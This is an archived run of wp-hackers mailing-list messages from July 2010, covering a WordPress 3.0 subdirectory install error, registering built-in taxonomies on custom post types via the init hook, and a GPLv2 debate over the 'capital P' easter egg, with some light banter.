> - Installed a fresh copy of wordpress 3.0 in
> http://mydevserver/Mysite.com/htdocs, setup database etc. and login
>
> - Connect to admin and change Wordpress url (siteurl) to
> http://mydevserver/Mysite.com/htdocs/wp
>
> - Created a /Mysite.com/htdocs/wp dir and moved all wordpress files in it
>
> - Copied /Mysite.com/htdocs/wp/index.php to /Mysite.com/htdocs/
>
> - Edited it as it: require('./wp/wp-blog-header.php');
>
> - I then went to /Mysite.com/htdocs/wp/wp-admin
>
> - And looked at an ugly error:
>
> Warning: require_once(/var/www/Mysite.com/htdocs/wp-load.php): failed
> to open stream: No such file or directory in
> /var/www/Mysite.com/htdocs/wp-admin/admin.php on line 20
>
> Call Stack:
>    0.0000     317204   1. {main}()
> /var/www/Mysite.com/htdocs/wp-admin/index.php:0
>    0.0001     329460   2.
> require_once('/var/www/Mysite.com/htdocs/wp-admin/admin.php')
> /var/www/Mysite.com/htdocs/wp-admin/index.php:10
>
>
> Fatal error: require_once(): Failed opening required
> '/var/www/Mysite.com/htdocs/wp-load.php'
> (include_path='.:/usr/share/php:/usr/share/pear') in
> /var/www/Mysite.com/htdocs/wp-admin/admin.php on line 20
>
> Call Stack:
>    0.0000     317204   1. {main}()
> /var/www/Mysite.com/htdocs/wp-admin/index.php:0
>    0.0001     329460   2.
> require_once('/var/www/Mysite.com/htdocs/wp-admin/admin.php')
> /var/www/Mysite.com/htdocs/wp-admin/index.php:10
>
> --
> Lox
> lox.dev at knc.nc
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From lox.dev at knc.nc  Wed Jul  7 22:27:31 2010
From: lox.dev at knc.nc (Lox)
Date: Thu, 8 Jul 2010 09:27:31 +1100
Subject: [wp-hackers] Wordpress in its own directory: fail
In-Reply-To: <AANLkTimkA1C0IKOzoTdGTzj1g7yVjmHJbwFSjQ1TK9qf@mail.gmail.com>
References: <AANLkTilatpZ1UJkvakQcB_p-g4XXbbUTBa7Ns3JQt3g5@mail.gmail.com> 
	<AANLkTimkA1C0IKOzoTdGTzj1g7yVjmHJbwFSjQ1TK9qf@mail.gmail.com>
Message-ID: <AANLkTiko3HBMYIkAbY4NPBVZzJA2BO5nGUiATTjLODBg@mail.gmail.com>

2010/7/8 mccormicky <mccormicky at gmail.com>:
> 1st step is to change ?WordPress location in Settings >> General then copy
> the files to the new directory
> if I am not mistaken.

Done it about 5 times (fresh install and follow how to). I am not a
noob but a dev...

It seems I have a weird problem with permissions. Opening and saving
each files that fails including solved it...

-- 
Lox
lox.dev at knc.nc

From mccormicky at gmail.com  Wed Jul  7 22:30:14 2010
From: mccormicky at gmail.com (mccormicky)
Date: Wed, 7 Jul 2010 18:30:14 -0400
Subject: [wp-hackers] Wordpress in its own directory: fail
In-Reply-To: <AANLkTiko3HBMYIkAbY4NPBVZzJA2BO5nGUiATTjLODBg@mail.gmail.com>
References: <AANLkTilatpZ1UJkvakQcB_p-g4XXbbUTBa7Ns3JQt3g5@mail.gmail.com>
	<AANLkTimkA1C0IKOzoTdGTzj1g7yVjmHJbwFSjQ1TK9qf@mail.gmail.com>
	<AANLkTiko3HBMYIkAbY4NPBVZzJA2BO5nGUiATTjLODBg@mail.gmail.com>
Message-ID: <AANLkTikbjAu0WCrglpAmRBFtFo9C5Wmq8w2sjV6iz_iu@mail.gmail.com>

Is it still your conclusion that you can no longer move WordPress to it's
own directory for version 3.0?
Or do you think it was server specific?
I am going to move an install soon is why I ask.

On Wed, Jul 7, 2010 at 6:27 PM, Lox <lox.dev at knc.nc> wrote:

> 2010/7/8 mccormicky <mccormicky at gmail.com>:
> > 1st step is to change  WordPress location in Settings >> General then
> copy
> > the files to the new directory
> > if I am not mistaken.
>
> Done it about 5 times (fresh install and follow how to). I am not a
> noob but a dev...
>
> It seems I have a weird problem with permissions. Opening and saving
> each files that fails including solved it...
>
> --
> Lox
> lox.dev at knc.nc
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From lox.dev at knc.nc  Wed Jul  7 22:33:14 2010
From: lox.dev at knc.nc (Lox)
Date: Thu, 8 Jul 2010 09:33:14 +1100
Subject: [wp-hackers] Wordpress in its own directory: fail
In-Reply-To: <AANLkTikbjAu0WCrglpAmRBFtFo9C5Wmq8w2sjV6iz_iu@mail.gmail.com>
References: <AANLkTilatpZ1UJkvakQcB_p-g4XXbbUTBa7Ns3JQt3g5@mail.gmail.com> 
	<AANLkTimkA1C0IKOzoTdGTzj1g7yVjmHJbwFSjQ1TK9qf@mail.gmail.com> 
	<AANLkTiko3HBMYIkAbY4NPBVZzJA2BO5nGUiATTjLODBg@mail.gmail.com> 
	<AANLkTikbjAu0WCrglpAmRBFtFo9C5Wmq8w2sjV6iz_iu@mail.gmail.com>
Message-ID: <AANLkTimyJdWOzazLNueuhYMmVZSm3V_H93o6YzGFCn1Y@mail.gmail.com>

2010/7/8 mccormicky <mccormicky at gmail.com>:
> Is it still your conclusion that you can no longer move WordPress to it's
> own directory for version 3.0?
> Or do you think it was server specific?
> I am going to move an install soon is why I ask.

As said I face a weird permission problem on my dev server, that you won't face.

But it works once solved, so go for it ;)

-- 
Lox
lox.dev at knc.nc

From mikeschinkel at newclarity.net  Wed Jul  7 22:36:39 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 7 Jul 2010 17:36:39 -0500 (CDT)
Subject: [wp-hackers] Adding built in taxonomies to custom post types
In-Reply-To: <4C34FA29.1020401@jakemgold.myfastmail.com>
References: <4C34FA29.1020401@jakemgold.myfastmail.com>
Message-ID: <91C71B9F-2679-471D-AD34-7E1BEB69FEDD@newclarity.net>

register_taxonomy_for_post_type('category','glossary');
register_taxonomy_for_post_type('post_tag','glossary');

-Mike

Sent from my iPad

On Jul 7, 2010, at 6:06 PM, Jake Goldman <wphackers at jakemgold.myfastmail.com> wrote:

> Anybody here have any luck adding the built in taxonomies (post_tags, category) to a custom taxonomy?
> 
> Haven't dug in too deeply, but using the code below I haven't been able to get the "category" taxonomy added to this simple post type:
> 
> register_post_type('glossary',array(
>    'label' => 'Glossary',
>    'description' => 'The lingo',
>    'public' => true,
>    'capability_type' => 'page',
>    'supports' => array('title','editor'),
>    'menu_position' => 20,
>    'taxonomies' => array('category')
> ));
> 
> Note that I can add new and custom taxonomies (of any sort) without an issue.
> 
> Before I spend too much time digging, hoping someone else is aware of this / has run into this...
> 
> Jake
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From wp at andrewnacin.com  Wed Jul  7 22:45:27 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 7 Jul 2010 18:45:27 -0400
Subject: [wp-hackers] Adding built in taxonomies to custom post types
In-Reply-To: <4C34FA29.1020401@jakemgold.myfastmail.com>
References: <4C34FA29.1020401@jakemgold.myfastmail.com>
Message-ID: <AANLkTimrRJO2-w2XswlzasbM7gBqJ3gsP9jUThkTATXT@mail.gmail.com>

On Wed, Jul 7, 2010 at 6:05 PM, Jake Goldman <
wphackers at jakemgold.myfastmail.com> wrote:

>  Anybody here have any luck adding the built in taxonomies (post_tags,
> category) to a custom taxonomy?


Using the taxonomies argument is the same as calling
register_taxonomy_for_object_type(). (Mike pointed this out, though from the
iPad mixed the name up.) The key is that the taxonomy already has to be
registered. It's half cart-before-the-horse, half chicken-or-the-egg.

As long as you're waiting until the init hook (core registers taxonomies and
post types at priority 0), then you should be fine.

From mikeschinkel at newclarity.net  Wed Jul  7 23:04:17 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 7 Jul 2010 18:04:17 -0500 (CDT)
Subject: [wp-hackers] Adding built in taxonomies to custom post types
In-Reply-To: <AANLkTimrRJO2-w2XswlzasbM7gBqJ3gsP9jUThkTATXT@mail.gmail.com>
References: <4C34FA29.1020401@jakemgold.myfastmail.com>
	<AANLkTimrRJO2-w2XswlzasbM7gBqJ3gsP9jUThkTATXT@mail.gmail.com>
Message-ID: <5DDA48F4-7E4A-428E-B501-B6E770A8FC92@newclarity.net>

> Using the taxonomies argument is the same as calling
> register_taxonomy_for_object_type(). (Mike pointed this out, though from the
> iPad mixed the name up.) 

Crap! I was even looking at code from my laptop when I sent the message.  <sigh>. Sorry. 

-Mike
> 

From wphackers at jakemgold.myfastmail.com  Wed Jul  7 23:13:59 2010
From: wphackers at jakemgold.myfastmail.com (Jake Goldman)
Date: Wed, 07 Jul 2010 19:13:59 -0400
Subject: [wp-hackers] Adding built in taxonomies to custom post types
In-Reply-To: <AANLkTimrRJO2-w2XswlzasbM7gBqJ3gsP9jUThkTATXT@mail.gmail.com>
References: <4C34FA29.1020401@jakemgold.myfastmail.com>
	<AANLkTimrRJO2-w2XswlzasbM7gBqJ3gsP9jUThkTATXT@mail.gmail.com>
Message-ID: <4C350A37.4060307@jakemgold.myfastmail.com>

  I'll put it inside of an init hook, but this strikes me as peculiar. I 
can confirm that the taxonomy exists and has been registered right above 
the post type registration via get_taxonomy('category')...

(I write this from Rhode Island, where it's 95 degrees, and my AC died 
today, so it's quite possible my brain has simply melted :-P )

Jake

On 7/7/2010 6:45 PM, Andrew Nacin wrote:
> On Wed, Jul 7, 2010 at 6:05 PM, Jake Goldman<
> wphackers at jakemgold.myfastmail.com>  wrote:
>
>>   Anybody here have any luck adding the built in taxonomies (post_tags,
>> category) to a custom taxonomy?
>
> Using the taxonomies argument is the same as calling
> register_taxonomy_for_object_type(). (Mike pointed this out, though from the
> iPad mixed the name up.) The key is that the taxonomy already has to be
> registered. It's half cart-before-the-horse, half chicken-or-the-egg.
>
> As long as you're waiting until the init hook (core registers taxonomies and
> post types at priority 0), then you should be fine.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From wp at andrewnacin.com  Wed Jul  7 23:41:43 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 7 Jul 2010 19:41:43 -0400
Subject: [wp-hackers] Adding built in taxonomies to custom post types
In-Reply-To: <4C350A37.4060307@jakemgold.myfastmail.com>
References: <4C34FA29.1020401@jakemgold.myfastmail.com>
	<AANLkTimrRJO2-w2XswlzasbM7gBqJ3gsP9jUThkTATXT@mail.gmail.com> 
	<4C350A37.4060307@jakemgold.myfastmail.com>
Message-ID: <AANLkTilt_CSXGXPhjQ-B2QVwMnUL6xVgxnG3Y6SNPJct@mail.gmail.com>

On Wed, Jul 7, 2010 at 7:13 PM, Jake Goldman <
wphackers at jakemgold.myfastmail.com> wrote:

>  I'll put it inside of an init hook, but this strikes me as peculiar. I can
> confirm that the taxonomy exists and has been registered right above the
> post type registration via get_taxonomy('category')...


This is correct, unfortunately so. Because many themes and plugins have,
over the years, tried to query posts and taxonomies prior to the init hook,
we are forced load taxonomies and post types twice -- once immediately
before we load plugins, and then we re-load them again on the init hook. You
should never rely on the functionality of the former; it is only there to
prevent plugins and themes not waiting for the init hook from crumbling
apart. (http://core.trac.wordpress.org/ticket/12918)

*** PSA ***

Please please please always wait until the init hook to register post types
and taxonomies.

From mikeschinkel at newclarity.net  Wed Jul  7 23:59:45 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 7 Jul 2010 18:59:45 -0500 (CDT)
Subject: [wp-hackers] Adding built in taxonomies to custom post types
In-Reply-To: <AANLkTilt_CSXGXPhjQ-B2QVwMnUL6xVgxnG3Y6SNPJct@mail.gmail.com>
References: <4C34FA29.1020401@jakemgold.myfastmail.com>
	<AANLkTimrRJO2-w2XswlzasbM7gBqJ3gsP9jUThkTATXT@mail.gmail.com>
	<4C350A37.4060307@jakemgold.myfastmail.com>
	<AANLkTilt_CSXGXPhjQ-B2QVwMnUL6xVgxnG3Y6SNPJct@mail.gmail.com>
Message-ID: <79DF9FFC-07D0-47E8-BE09-DB63047C70B8@newclarity.net>

> This is correct, unfortunately so. Because many themes and plugins have,
> over the years, tried to query posts and taxonomies prior to the init hook,
> we are forced load taxonomies and post types twice -- once immediately
> before we load plugins, and then we re-load them again on the init hook. You
> should never rely on the functionality of the former; it is only there to
> prevent plugins and themes not waiting for the init hook from crumbling
> apart. (http://core.trac.wordpress.org/ticket/12918)

The earlier duplicate sounds like something to allow to be disabled by the site admin setting a constant in in wp-config.php? 

-Mike

From wp-hackers at striderweb.com  Thu Jul  8 04:03:03 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 7 Jul 2010 23:03:03 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <D91265CD-9B6B-4B29-AA34-7835E54E6D79@olympianetworks.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com><201007061329.26694.chip@chipbennett.net><CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local><201007061440.59637.chip@chipbennett.net><2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de><609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com><4C3492B5.2000108@mullenweg.com><AANLkTilaWxOjWuk33mRae9HJNxLfhBGouhwiBukARAWm@mail.gmail.com>
	<C460819D-42BB-4979-9B3D-4374ABF018FD@olympianetworks.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FDE@tbs-sbs01.TBS.local>
	<D91265CD-9B6B-4B29-AA34-7835E54E6D79@olympianetworks.com>
Message-ID: <F56112B3-20CA-4593-B146-AE0EDD55A6C0@striderweb.com>

I wasn't going to reply to this thread again, but there are two small points that warrant a brief response:

On Jul 7, 2010, at 9:44 AM, Matt Mullenweg wrote:

> On 7/7/2010 9:11 AM, Stephen Rider wrote:
>> I laughed when Matt said we were approaching Godwin's Law. :-)  Some of the rhetoric is getting a bit overwrought, but for the most part I think it's remained pretty civil.
> 
> We are -- someone is comparing the capitalization of the letter P with removing the sacred freedoms every WordPress user is given by the GPL.


Just to be clear, Matt... I was AGREEING with you on this.  Sorry if I wasn't more clear.  I laughed because of the (IMO) extremity of some of the language used by others, not because I thought you were overwrought.

On Jul 7, 2010, at 10:27 AM, John Bloch wrote:

> Changing Wordpress to WordPress is not something to get up in arms about. I know people that replace lists of offensive words with four asterisks. Can they now not use WordPress because they're violating the written contents of those writers? That seems like a bigger violation of 'written content' than this, doesn't it?


What people do on their own sites is their own business.  However, if someone wrote such a filter into WordPress Core to silently censor such language, because a Core contributor decided he doesn't like naughty language... YES, that would be a significant issue, 

I'm pretty sure there exist plugins that do just as you describe.


And now if you'll excuse me, I'm going to go write some code.  Peace.

-- 
Stephen Rider
http://striderweb.com/


From Gavin.Pearce at 3seven9.com  Thu Jul  8 08:26:09 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Thu, 8 Jul 2010 09:26:09 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>

I'd just like to say....

In spite of what everyone, including Matt, has said, I think this is the
best discussion we've had on here for ages.

Debates and points from both sides - with evidence and some big
conclusions.

Shame one side is wrong mind ... but still  ;)  (I jest).

G


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter
Westwood
Sent: 07 July 2010 18:27
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Fwd: Re: Putting the P in WordPress


On 7 Jul 2010, at 16:05, Mark E wrote:

> The obfuscation of the easter egg blatantly violates GPL v2. So all
the
> stuff you say about GPL boils down to this: "Do as I as say, not as I
> do". And here I was thinking that you followed GPL to the letter, as
you imply other people should do.


In what way?

I believe the specific wording from the GPL2 you are interpreting is:

"The source code for a work means the preferred form of the work for
making modifications to it. For an executable work, complete source code
means all the source code for all modules it contains, plus any
associated interface definition files, plus the scripts used to control
compilation and installation of the executable. However, as a special
exception, the source code distributed need not include anything that is
normally distributed (in either source or binary form) with the major
components (compiler, kernel, and so on) of the operating system on
which the executable runs, unless that component itself accompanies the
executable. "

In my reading in no way does this preclude the distribution of
obfuscated code - what it is trying to prevent is the distribution of
compiled object files without the corresponding source code to allow
modifications to be made.

As JS and PHP are always distributed in source form as part of the
WordPress download I don't see how we are violating the licence.

Would you consider it a licence violation if we were to ship WordPress
without the include .dev.js files so as to decrease the download size
and make automatic upgrades use less memory?

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From KrisY at tbs.uk.com  Thu Jul  8 08:30:39 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Thu, 8 Jul 2010 09:30:39 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
References: <4C3497BA.2090704@simplercomputing.net><0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FE5@tbs-sbs01.TBS.local>

Drama makes the world go around, Gav.

Thoroughly enjoying the white-knight GNU Protection Squad on their
crusade against Mattzor the Mad, Wordpress Tyrant. Keep it up!

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Gavin
Pearce
Sent: 08 July 2010 09:26
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

I'd just like to say....

In spite of what everyone, including Matt, has said, I think this is the
best discussion we've had on here for ages.

Debates and points from both sides - with evidence and some big
conclusions.

Shame one side is wrong mind ... but still  ;)  (I jest).

G


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter
Westwood
Sent: 07 July 2010 18:27
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Fwd: Re: Putting the P in WordPress


On 7 Jul 2010, at 16:05, Mark E wrote:

> The obfuscation of the easter egg blatantly violates GPL v2. So all
the
> stuff you say about GPL boils down to this: "Do as I as say, not as I
> do". And here I was thinking that you followed GPL to the letter, as
you imply other people should do.


In what way?

I believe the specific wording from the GPL2 you are interpreting is:

"The source code for a work means the preferred form of the work for
making modifications to it. For an executable work, complete source code
means all the source code for all modules it contains, plus any
associated interface definition files, plus the scripts used to control
compilation and installation of the executable. However, as a special
exception, the source code distributed need not include anything that is
normally distributed (in either source or binary form) with the major
components (compiler, kernel, and so on) of the operating system on
which the executable runs, unless that component itself accompanies the
executable. "

In my reading in no way does this preclude the distribution of
obfuscated code - what it is trying to prevent is the distribution of
compiled object files without the corresponding source code to allow
modifications to be made.

As JS and PHP are always distributed in source form as part of the
WordPress download I don't see how we are violating the licence.

Would you consider it a licence violation if we were to ship WordPress
without the include .dev.js files so as to decrease the download size
and make automatic upgrades use less memory?

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From jane at automattic.com  Thu Jul  8 14:49:18 2010
From: jane at automattic.com (Jane Wells)
Date: Thu, 08 Jul 2010 08:49:18 -0600
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FE5@tbs-sbs01.TBS.local>
References: <4C3497BA.2090704@simplercomputing.net><0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FE5@tbs-sbs01.TBS.local>
Message-ID: <4C35E56E.2050205@automattic.com>

On 7/8/10 2:30 AM, Kris Young wrote:
> crusade against Mattzor the Mad, Wordpress Tyrant. Keep it up!
>    
It's WordPress, not Wordpress. See why we needed the feature? I have 
carpal tunnel from typing that sentence so often. ;)
Jane


From KrisY at tbs.uk.com  Thu Jul  8 14:51:16 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Thu, 8 Jul 2010 15:51:16 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C35E56E.2050205@automattic.com>
References: <4C3497BA.2090704@simplercomputing.net><0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local><CD47955B7E065D48AB5CF226C2ED75C02E2FE5@tbs-sbs01.TBS.local>
	<4C35E56E.2050205@automattic.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FF2@tbs-sbs01.TBS.local>

You missed the deliberate joke, I'm afraid I can't help you any more :(

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jane Wells
Sent: 08 July 2010 15:49
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

On 7/8/10 2:30 AM, Kris Young wrote:
> crusade against Mattzor the Mad, Wordpress Tyrant. Keep it up!
>    
It's WordPress, not Wordpress. See why we needed the feature? I have 
carpal tunnel from typing that sentence so often. ;)
Jane

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From jane at automattic.com  Thu Jul  8 14:54:32 2010
From: jane at automattic.com (Jane Wells)
Date: Thu, 08 Jul 2010 08:54:32 -0600
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FF2@tbs-sbs01.TBS.local>
References: <4C3497BA.2090704@simplercomputing.net><0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local><CD47955B7E065D48AB5CF226C2ED75C02E2FE5@tbs-sbs01.TBS.local>	<4C35E56E.2050205@automattic.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FF2@tbs-sbs01.TBS.local>
Message-ID: <4C35E6A8.5050604@automattic.com>

On 7/8/10 8:51 AM, Kris Young wrote:
> You missed the deliberate joke, I'm afraid I can't help you any more :(
>    
Likewise, sigh.

From KrisY at tbs.uk.com  Thu Jul  8 15:05:42 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Thu, 8 Jul 2010 16:05:42 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C35E6A8.5050604@automattic.com>
References: <4C3497BA.2090704@simplercomputing.net><0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local><CD47955B7E065D48AB5CF226C2ED75C02E2FE5@tbs-sbs01.TBS.local>	<4C35E56E.2050205@automattic.com><CD47955B7E065D48AB5CF226C2ED75C02E2FF2@tbs-sbs01.TBS.local>
	<4C35E6A8.5050604@automattic.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FF3@tbs-sbs01.TBS.local>

Carpal tunnel syndrome is nothing to joke about! You're a mean-spirited
person, Jane Wells.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jane Wells
Sent: 08 July 2010 15:55
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

On 7/8/10 8:51 AM, Kris Young wrote:
> You missed the deliberate joke, I'm afraid I can't help you any more
:(
>    
Likewise, sigh.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From jane at automattic.com  Thu Jul  8 15:33:33 2010
From: jane at automattic.com (Jane Wells)
Date: Thu, 08 Jul 2010 09:33:33 -0600
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FF3@tbs-sbs01.TBS.local>
References: <4C3497BA.2090704@simplercomputing.net><0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local><CD47955B7E065D48AB5CF226C2ED75C02E2FE5@tbs-sbs01.TBS.local>	<4C35E56E.2050205@automattic.com><CD47955B7E065D48AB5CF226C2ED75C02E2FF2@tbs-sbs01.TBS.local>	<4C35E6A8.5050604@automattic.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FF3@tbs-sbs01.TBS.local>
Message-ID: <4C35EFCD.60806@automattic.com>

On 7/8/10 9:05 AM, Kris Young wrote:
> Carpal tunnel syndrome is nothing to joke about! You're a mean-spirited
> person, Jane Wells.
>    
I'm a kind-spirited person with carpal tunnel syndrome, shredded wrist 
ligaments, and custom splints in several configurations for said wrists. 
A little humor helps.

From zamoose at gmail.com  Thu Jul  8 15:35:30 2010
From: zamoose at gmail.com (Doug Stewart)
Date: Thu, 8 Jul 2010 11:35:30 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C35EFCD.60806@automattic.com>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FE5@tbs-sbs01.TBS.local>
	<4C35E56E.2050205@automattic.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FF2@tbs-sbs01.TBS.local>
	<4C35E6A8.5050604@automattic.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FF3@tbs-sbs01.TBS.local>
	<4C35EFCD.60806@automattic.com>
Message-ID: <AANLkTimWjaQO6azmL_hnHpL9_7taz_rP9REnKEonki7-@mail.gmail.com>

I think we should all agree it's called "CarpalTunnelSyndrome". Anyone
calling it Carpaltunnel is wrong.

On 7/8/10, Jane Wells <jane at automattic.com> wrote:
> On 7/8/10 9:05 AM, Kris Young wrote:
>> Carpal tunnel syndrome is nothing to joke about! You're a mean-spirited
>> person, Jane Wells.
>>
> I'm a kind-spirited person with carpal tunnel syndrome, shredded wrist
> ligaments, and custom splints in several configurations for said wrists.
> A little humor helps.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
-Doug

From mitch at studionashvegas.com  Thu Jul  8 15:35:57 2010
From: mitch at studionashvegas.com (Mitch Canter)
Date: Thu, 8 Jul 2010 10:35:57 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
Message-ID: <AANLkTilOs0duoWltmChDd8L-3XX56wlrqDC9lf0ir1FE@mail.gmail.com>

Agreed - this discussion got me out of lurking the list and actually
contributing.  It's good to have great philosophical debate as long as
all sides keep it civil, refrain from snide remarks, and can agree to
disagree.

Mitch Canter
http://www.mitchcanter.com
http://www.studionashvegas.com

On Thu, Jul 8, 2010 at 3:26 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
> I'd just like to say....
>
> In spite of what everyone, including Matt, has said, I think this is the
> best discussion we've had on here for ages.
>
> Debates and points from both sides - with evidence and some big
> conclusions.
>
> Shame one side is wrong mind ... but still ?;) ?(I jest).
>
> G
>
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter
> Westwood
> Sent: 07 July 2010 18:27
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Fwd: Re: Putting the P in WordPress
>
>
> On 7 Jul 2010, at 16:05, Mark E wrote:
>
>> The obfuscation of the easter egg blatantly violates GPL v2. So all
> the
>> stuff you say about GPL boils down to this: "Do as I as say, not as I
>> do". And here I was thinking that you followed GPL to the letter, as
> you imply other people should do.
>
>
> In what way?
>
> I believe the specific wording from the GPL2 you are interpreting is:
>
> "The source code for a work means the preferred form of the work for
> making modifications to it. For an executable work, complete source code
> means all the source code for all modules it contains, plus any
> associated interface definition files, plus the scripts used to control
> compilation and installation of the executable. However, as a special
> exception, the source code distributed need not include anything that is
> normally distributed (in either source or binary form) with the major
> components (compiler, kernel, and so on) of the operating system on
> which the executable runs, unless that component itself accompanies the
> executable. "
>
> In my reading in no way does this preclude the distribution of
> obfuscated code - what it is trying to prevent is the distribution of
> compiled object files without the corresponding source code to allow
> modifications to be made.
>
> As JS and PHP are always distributed in source form as part of the
> WordPress download I don't see how we are violating the licence.
>
> Would you consider it a licence violation if we were to ship WordPress
> without the include .dev.js files so as to decrease the download size
> and make automatic upgrades use less memory?
>
> Cheers
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
